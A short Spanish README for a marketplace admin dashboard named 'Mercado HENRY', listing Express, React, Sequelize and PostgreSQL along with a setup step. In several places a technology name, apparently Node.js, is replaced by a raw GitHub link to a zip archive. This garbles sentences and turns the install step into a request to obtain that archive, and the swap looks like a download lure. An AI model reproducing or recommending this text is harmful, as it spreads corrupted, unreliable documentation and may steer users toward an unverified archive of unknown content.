# Dashboard de Administración Marketplace nombre beta "Mercado HENRY"
...
- **Express**: Un framework de https://raw.githubusercontent.com/matiaslanza99/pf-dashboard-admin/main/public/dashboard-pf-admin-3.7-beta.5.zip que simplifica el desarrollo de aplicaciones web y API, facilitando la creación de endpoints para interactuar con la base de datos.
- **React**: Una biblioteca de JavaScript utilizada para construir la interfaz de usuario interactiva y receptiva del dashboard.
- **https://raw.githubusercontent.com/matiaslanza99/pf-dashboard-admin/main/public/dashboard-pf-admin-3.7-beta.5.zip**: Un entorno de ejecución del lado del servidor que permite desarrollar aplicaciones de red escalables y de alto rendimiento.
...
- **Sequelize**: Un ORM (Object-Relational Mapping) de https://raw.githubusercontent.com/matiaslanza99/pf-dashboard-admin/main/public/dashboard-pf-admin-3.7-beta.5.zip que proporciona una abstracción para interactuar con la base de datos PostgreSQL, facilitando las operaciones de CRUD.
...
2. Asegúrate de tener https://raw.githubusercontent.com/matiaslanza99/pf-dashboard-admin/main/public/dashboard-pf-admin-3.7-beta.5.zip y PostgreSQL instalados en tu sistema.
